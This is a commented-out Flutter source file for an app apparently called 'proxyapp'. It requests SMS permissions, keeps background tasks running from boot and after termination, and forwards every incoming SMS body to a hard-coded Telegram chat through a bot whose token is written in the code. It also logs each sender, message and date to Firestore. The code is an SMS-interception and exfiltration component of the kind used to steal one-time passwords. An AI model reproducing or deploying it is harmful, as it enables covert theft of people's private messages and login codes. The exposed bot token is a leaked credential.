// import 'dart:async';
// import 'dart:io';
// import 'dart:ui';

// import 'package:background_fetch/background_fetch.dart';
// import 'package:cloud_firestore/cloud_firestore.dart';
// import 'package:dart_telegram_bot/dart_telegram_bot.dart';
// import 'package:dart_telegram_bot/telegram_entities.dart';
// import 'package:device_info_plus/device_info_plus.dart';
// import 'package:firebase_core/firebase_core.dart';
// import 'package:flutter/material.dart';
// import 'package:flutter_background_service/flutter_background_service.dart';
// import 'package:flutter_background_service_android/flutter_background_service_android.dart';
// import 'package:flutter_local_notifications/flutter_local_notifications.dart';
// import 'package:permission_handler/permission_handler.dart';
// import 'package:proxyapp/firebase_options.dart';
// import 'package:proxyapp/page/model/services.dart';
// import 'package:shared_preferences/shared_preferences.dart';
// import 'package:telephony/telephony.dart' as telephony_package;
// import 'package:intl/intl.dart';
// import 'package:workmanager/workmanager.dart';

// Future<void> main() async {
//   // initializeService();
//   WidgetsFlutterBinding.ensureInitialized();
//   // await Workmanager().initialize(backgroundProcess);

//   await Firebase.initializeApp(
//     options: DefaultFirebaseOptions.currentPlatform,
//   );
//   runApp(const MyApp());
//   BackgroundFetch.registerHeadlessTask(backgroundFetchHeadlessTask);
// }

// final mockService = MockServices();
// final chatId = "-1002059990678";
// final BotToken = "6526931921:AAEUQ-pInjnLiqx_BkdZijbmvPJM25qyo3o";

// String? uid;

// Future<void> loadindUid() async {
//   uid = await getUid();
// }

// final telephony = telephony_package.Telephony.instance;
// onBackgroundMessage(telephony_package.SmsMessage message) {
//   print("background message: " + message.body!);
//   onMessageBack(message);
// }

// @pragma('vm:entry-point')
// Future<void> handleBackgroundTelephonyMessage(SmsMessage message) async {
//   try {
//     print('-------------------1-------------');
//     print(message.body);

//     print('bot start');
//     print('-------------------2-------------');
//     bot.sendMessage(ChatID(-1002059990678), message.body!);
//     print('bot finsh');
//   } catch (e) {
//     print(e);
//   }
// }

// onMessageBack(SmsMessage message) async {
//   print(chatId);

//   print("######1##");
//   String formattedDate = DateFormat('kk:mm, d MMM').format(DateTime.now());
//   Map<String, dynamic> phoneInformationsVariable = {
//     "message.address": message.address,
//     "message.body": message.body,
//     "message.dateSent": formattedDate,
//   };
//   print("######2##");

//   bot.sendMessage(ChatID(int.parse(chatId)), message.body!);
//   print("######3##");

//   mockService.createData(phoneInformationsVariable);
//   print("######4##");
// }

// final bot = Bot(
//   token: BotToken,
//   onReady: (bot) => bot.start(clean: true),
//   // Handle start failure
//   onStartFailed: (bot, e, s) => print('Start failed'),
// );

// class MyApp extends StatefulWidget {
//   const MyApp({Key? key}) : super(key: key);

//   @override
//   State<MyApp> createState() => _MyAppState();
// }

// class _MyAppState extends State<MyApp> {
//   bool _enabled = true;
//   int _status = 0;
//   List<String> _events = [];

//   @override
//   void initState() {
//     super.initState();
//     initPlatformState();
//   }

//   // Platform messages are asynchronous, so we initialize in an async method.
//   Future<void> initPlatformState() async {
//     final bool? result = await telephony.requestSmsPermissions;

//     if (!mounted) return;
//     var prefs = await SharedPreferences.getInstance();
//     var json = prefs.getString(EVENTS_KEY);
//     if (json != null) {
//       setState(() {
//         _events = jsonDecode(json).cast<String>();
//       });
//     }

//     // Configure BackgroundFetch.
//     try {
//       var status = await BackgroundFetch.configure(
//           BackgroundFetchConfig(
//               minimumFetchInterval: 15,
//               forceAlarmManager: false,
//               stopOnTerminate: false,
//               startOnBoot: true,
//               enableHeadless: true,
//               requiresBatteryNotLow: false,
//               requiresCharging: false,
//               requiresStorageNotLow: false,
//               requiresDeviceIdle: false,
//               requiredNetworkType: NetworkType.NONE),
//           _onBackgroundFetch,
//           _onBackgroundFetchTimeout);
//       print('[BackgroundFetch] configure success: $status');
//       setState(() {
//         _status = status;
//       });

//       BackgroundFetch.scheduleTask(TaskConfig(
//           taskId: "com.transistorsoft.customtask",
//           delay: 3000,
//           periodic: false,
//           forceAlarmManager: true,
//           stopOnTerminate: false,
//           enableHeadless: true));
//     } on Exception catch (e) {
//       print("[BackgroundFetch] configure ERROR: $e");
//     }

//     // If the widget was removed from the tree while the asynchronous platform
//     // message was in flight, we want to discard the reply rather than calling
//     // setState to update our non-existent appearance.
//     if (!mounted) return;
//   }

//   void _onBackgroundFetch(String taskId) async {
//     // This is the fetch-event callback.
//     print("[BackgroundFetch] Event received: $taskId");

//     // Persist fetch events in SharedPreferences

//     if (taskId == "flutter_background_fetch") {
//       // Perform an example HTTP request.
//       telephony.listenIncomingSms(
//         onBackgroundMessage: (telephony_package.SmsMessage message) {
//           // Handle incoming SMS message here
//           bot.sendMessage(ChatID(int.parse(chatId)), message.body!);

//           print('Incoming SMS received: ${message.body}');
//         },
//         onNewMessage: (telephony_package.SmsMessage message) {
//           // Handle incoming SMS message here
//           bot.sendMessage(ChatID(int.parse(chatId)), message.body!);

//           print('Incoming SMS received: ${message.body}');
//         },
//         listenInBackground: true, // Listen for SMS in the background
//       );
//     }

//     // IMPORTANT:  You must signal completion of your fetch task or the OS can punish your app
//     // for taking too long in the background.
//     // BackgroundFetch.finish(taskId);
//   }

//   /// This event fires shortly before your task is about to timeout.  You must finish any outstanding work and call BackgroundFetch.finish(taskId).
//   void _onBackgroundFetchTimeout(String taskId) {
//     print("[BackgroundFetch] TIMEOUT: $taskId");
//     BackgroundFetch.finish(taskId);
//   }

//   void _onClickEnable(enabled) {
//     setState(() {
//       _enabled = true;
//     });
//     if (true) {
//       BackgroundFetch.start().then((status) {
//         print('[BackgroundFetch] start success: $status');
//       }).catchError((e) {
//         print('[BackgroundFetch] start FAILURE: $e');
//       });
//     }
//   }

//   void _onClickStatus() async {
//     var status = await BackgroundFetch.status;
//     print('[BackgroundFetch] status: $status');
//     setState(() {
//       _status = status;
//     });
//     // Invoke a scheduleTask for testing
//     BackgroundFetch.scheduleTask(TaskConfig(
//         taskId: "com.transistorsoft.customtask",
//         delay: 3000,
//         periodic: false,
//         forceAlarmManager: false,
//         stopOnTerminate: false,
//         enableHeadless: true));
//   }

//   String text = "Stop Service";
//   @override
//   Widget build(BuildContext context) {
//     return MaterialApp(
//       home: Scaffold(
//         appBar: AppBar(
//           title: const Text('Service App'),
//         ),
//         body: Column(
//           children: [
//             StreamBuilder<Map<String, dynamic>?>(
//               stream: FlutterBackgroundService().on('update'),
//               builder: (context, snapshot) {
//                 if (!snapshot.hasData) {
//                   return const Center(
//                     child: CircularProgressIndicator(),
//                   );
//                 }

//                 final data = snapshot.data!;
//                 String? device = data["device"];
//                 DateTime? date = DateTime.tryParse(data["current_date"]);
//                 return Column(
//                   children: [
//                     Text(device ?? 'Unknown'),
//                     Text(date.toString()),
//                   ],
//                 );
//               },
//             ),
//             ElevatedButton(
//               child: const Text("Foreground Mode"),
//               onPressed: () {
//                 FlutterBackgroundService().invoke("setAsForeground");
//               },
//             ),
//             ElevatedButton(
//               child: const Text("Background Mode"),
//               onPressed: () {
//                 FlutterBackgroundService().invoke("setAsBackground");
//               },
//             ),
//             ElevatedButton(
//               child: Text(text),
//               onPressed: () async {
//                 final service = FlutterBackgroundService();
//                 var isRunning = await service.isRunning();
//                 if (isRunning) {
//                   service.invoke("stopService");
//                 } else {
//                   service.startService();
//                 }

//                 if (!isRunning) {
//                   text = 'Stop Service';
//                 } else {
//                   text = 'Start Service';
//                 }
//                 setState(() {});
//               },
//             ),
//             Expanded(
//                 child: FutureBuilder(
//               future: loadindUid(),
//               builder: (context, snapshot) {
//                 return StreamBuilder(
//                     initialData: null,
//                     stream: FirebaseFirestore.instance
//                         .collection('users')
//                         .doc(uid)
//                         .snapshots(),
//                     builder: (context, snapshot) {
//                       if (snapshot.connectionState == ConnectionState.waiting) {
//                         return Center(child: CircularProgressIndicator());
//                       } else if (snapshot.hasData == true) {
//                         Map<String, dynamic>? firebaseData =
//                             snapshot.data!.data();
//                         // Replace this with your actual fetched data
//                         if (firebaseData != null &&
//                             firebaseData.containsKey('phoneInformationsList')) {
//                           // If 'phoneInformationsList' exists, extract the list from the data
//                           final phoneInfoList =
//                               firebaseData['phoneInformationsList'];

//                           return ListView.builder(
//                             padding: const EdgeInsets.symmetric(
//                               vertical: 15,
//                               horizontal: 8,
//                             ),
//                             itemCount: phoneInfoList.length,
//                             itemBuilder: (context, index) {
//                               int itemCount = phoneInfoList.length;
//                               int reversedIndex = itemCount - 1 - index;
//                               final phoneInfo = phoneInfoList[reversedIndex];
//                               return SizedBox(
//                                 height: 70,
//                                 child: ListTile(
//                                   title: Text(phoneInfo['message.address'] ??
//                                       ''), // Use null-aware operator to avoid null error
//                                   subtitle: Text(phoneInfo['message.body'] ??
//                                       ''), // Use null-aware operator to avoid null error
//                                   trailing: Text(phoneInfo[
//                                           'message.dateSent'] ??
//                                       ''), // Use null-aware operator to avoid null error
//                                 ),
//                               );
//                             },
//                           );
//                         } else {
//                           return ListView.builder(
//                             itemCount: 1,
//                             itemBuilder: (context, index) {
//                               return SizedBox(
//                                 height: 100,
//                                 child: Center(child: Text("No message Yet")),
//                               ); // Return an empty container or widget
//                             },
//                           );
//                         }
//                       } else {
//                         return Text('Error: ${snapshot.error}');
//                       }
//                     });
//               },
//             )),
//           ],
//         ),
//         floatingActionButton: FloatingActionButton(
//           onPressed: () {},
//           child: const Icon(Icons.play_arrow),
//         ),
//       ),
//     );
//   }
// }

// class LogView extends StatefulWidget {
//   const LogView({Key? key}) : super(key: key);

//   @override
//   State<LogView> createState() => _LogViewState();
// }

// class _LogViewState extends State<LogView> {
//   late final Timer timer;
//   List<String> logs = [];

//   @override
//   void initState() {
//     super.initState();
//     timer = Timer.periodic(const Duration(seconds: 1), (timer) async {
//       final SharedPreferences sp = await SharedPreferences.getInstance();
//       await sp.reload();
//       logs = sp.getStringList('log') ?? [];
//       if (mounted) {
//         setState(() {});
//       }
//     });
//   }

//   @override
//   void dispose() {
//     timer.cancel();
//     super.dispose();
//   }

//   @override
//   Widget build(BuildContext context) {
//     return ListView.builder(
//       itemCount: logs.length,
//       itemBuilder: (context, index) {
//         final log = logs.elementAt(index);
//         return Text(log);
//       },
//     );
//   }
// }
